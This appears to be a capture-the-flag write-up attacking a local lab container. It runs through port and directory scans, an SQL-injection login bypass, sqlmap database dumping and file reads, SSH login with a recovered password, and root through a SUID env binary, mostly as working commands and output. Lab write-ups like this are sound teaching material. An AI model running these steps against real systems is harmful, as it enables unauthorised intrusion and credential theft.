# IP
172.17.0.2
# Reconnaissance
```sh
ping -c 2 172.17.0.2

PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.058 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.048 ms

--- 172.17.0.2 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1044ms
rtt min/avg/max/mdev = 0.048/0.053/0.058/0.005 ms
```

Server is reachable
Probably a linux OS
# Ports scanning
```sh
sudo nmap -p- -sS -sV -sC -T4 --min-rate 5000 172.17.0.2

Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-17 14:45 -0300
Nmap scan report for 172.17.0.2
Host is up (0.0000020s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 84:aa:fd:4d:67:65:79:a1:a9:5a:76:55:04:5a:21:b5 (ECDSA)
|_  256 67:bb:74:40:28:18:94:00:0c:bf:fc:08:17:b1:61:8b (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: NaturGas Solutions - Dashboard Corporativo
|_http-server-header: Apache/2.4.52 (Ubuntu)
MAC Address: 4E:E2:98:ED:80:C4 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.47 seconds
```

Discovered two open ports
- 22 running SSH
- 80 running a web service in Apache
# Web enum
## Dir Fuzzing
```sh
gobuster dir -u http://172.17.0.2 -w /usr/share/seclists/Discovery/Web-Content/big.txt -x php,html,js,zip,rm
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              js,zip,rm,php,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.htaccess.zip        (Status: 403) [Size: 275]
.htaccess.php        (Status: 403) [Size: 275]
.htaccess.html       (Status: 403) [Size: 275]
.htaccess.rm         (Status: 403) [Size: 275]
.htaccess            (Status: 403) [Size: 275]
.htpasswd.php        (Status: 403) [Size: 275]
.htpasswd.zip        (Status: 403) [Size: 275]
.htpasswd.rm         (Status: 403) [Size: 275]
.htpasswd.html       (Status: 403) [Size: 275]
.htpasswd.js         (Status: 403) [Size: 275]
.htaccess.js         (Status: 403) [Size: 275]
.htpasswd            (Status: 403) [Size: 275]
bills                (Status: 301) [Size: 308] [--> http://172.17.0.2/bills/]
index.php            (Status: 200) [Size: 11622]
intranet             (Status: 301) [Size: 311] [--> http://172.17.0.2/intranet/]
proveedores          (Status: 301) [Size: 314] [--> http://172.17.0.2/proveedores/]
server-status        (Status: 403) [Size: 275]
Progress: 122886 / 122886 (100.00%)
===============================================================
Finished
===============================================================
```

Found http://172.17.0.2/bills which is a login page
## SQLI
Login is vulnerable to a basic SQLI

```sh
curl -i -X POST -d "username=admin%27+--+%27&password=123" http://172.17.0.2/bills/
HTTP/1.1 200 OK
Date: Thu, 17 Sep 2026 18:25:29 GMT
Server: Apache/2.4.52 (Ubuntu)
Set-Cookie: PHPSESSID=r30mqogdr1bb36gqk140i47vnj; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 79
Content-Type: text/html; charset=UTF-8

<h2>Login success: Admin</h2><script>window.location.href='panel.php';</script>
```

## SQLMAP
```sh
sqlmap -u http://172.17.0.2/bills --data="username=admin&password=123" --dbs --batch
```

``` sh
sqlmap identified the following injection point(s) with a total of 107 HTTP(s) requests:
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=admin' AND (SELECT 4030 FROM (SELECT(!SLEEP(5)))BfLP) AND 'kVuU'='kVuU&password=123
---
web server operating system: Linux Ubuntu 22.04 (jammy)
web application technology: Apache 2.4.52, PHP
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] register
[*] sys
```

```sh
sqlmap -u http://172.17.0.2/bills --data="username=admin&password=123" -D register --tables --batch
```

``` 
Database: register
[1 table]
+-------+
| users |
+-------+
```

```sh
sql -u http://172.17.0.2/bills --data="username=admin&password=123" -D register -T users --dump --batch
```

```
Database: register
Table: users
[3 entries]
+----+-----------+----------+
| id | passwd    | username |
+----+-----------+----------+
| 1  | mario123  | Mario    |
| 2  | jesus2026 | Jesus    |
| 3  | admin123  | Admin    |
+----+-----------+----------+
```

We could not read valuable data since we could already login as admin with basic SQLI and other users do not have privileges to access the panel
## File read
```sh
sqlmap -u http://172.17.0.2/bills --data="username=admin&password=123" --file-read "/var/www/html/bills/panel.php" --batch
```

```
$database = [
    'xya123', 'xya456', 'xya789', 'xyb234', 'xyb567',
    'xyb890', 'xyc123', 'xyc456', 'xyd234', 'xyd567',
    'xyd890', 'xye123', 'xye456', 'xye789', 'xyf234',
    'xyf567', 'xyf890', 'xyg123', 'xyg456', 'xyc724' // ID vulnerable
];
```

Looking up for this id
![[Pasted image 20260918113250.png]]
# SSH login
```sh
ssh duque@172.17.0.2
duque@172.17.0.2's password: duquelaje81029557!
```
# Privilege escalation
## SUID
```sh
find / -perm -4000 2>/dev/null
/usr/bin/chsh
/usr/bin/umount
/usr/bin/env
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/passwd
/usr/bin/sudo
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
```

```sh
/usr/bin/env /bin/sh -p
```
## Root
```sh
whoami
root
```
